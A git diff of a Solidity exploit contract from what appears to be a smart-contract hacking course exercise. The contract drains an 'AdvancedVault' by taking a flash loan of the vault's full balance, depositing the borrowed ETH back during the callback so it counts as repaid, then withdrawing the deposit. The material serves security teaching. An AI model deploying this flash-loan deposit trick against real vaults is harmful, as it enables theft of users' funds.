@@ -1,38 +1,32 @@
 // SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
 // https://smartcontractshacking.com/#copyright-policy
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "@openzeppelin/contracts/utils/Address.sol";
-
-interface IAdvancedVault {
-    function depositETH() external payable;
-
-    function withdrawETH() external;
-
-    function flashLoanETH(uint256 amount) external;
-}
+import {AdvancedVault} from "./AdvancedVault.sol";
 
 contract AttackAdvancedVault {
-    using Address for address payable;
+    AdvancedVault advancedVault;
+    uint256 count;
+    uint256 total;
 
-    IAdvancedVault vault;
-    address public immutable owner;
-
-    constructor(address _vault) {
-        vault = IAdvancedVault(_vault);
-        owner = msg.sender;
+    constructor(address _advancedVault) {
+        advancedVault = AdvancedVault(_advancedVault);
+        total = address(advancedVault).balance;
     }
 
     function attack() external {
-        vault.flashLoanETH(address(vault).balance);
-        vault.withdrawETH();
+        advancedVault.flashLoanETH(total);
+    }
+
+    function withdraw() external payable {
+        advancedVault.withdrawETH();
+        msg.sender.call{value: total}("");
     }
 
     function callBack() external payable {
-        vault.depositETH{value: msg.value}();
+        advancedVault.depositETH{value: total}();
     }
 
-    receive() external payable {
-        payable(owner).sendValue(msg.value);
-    }
+    receive() external payable {}
 }
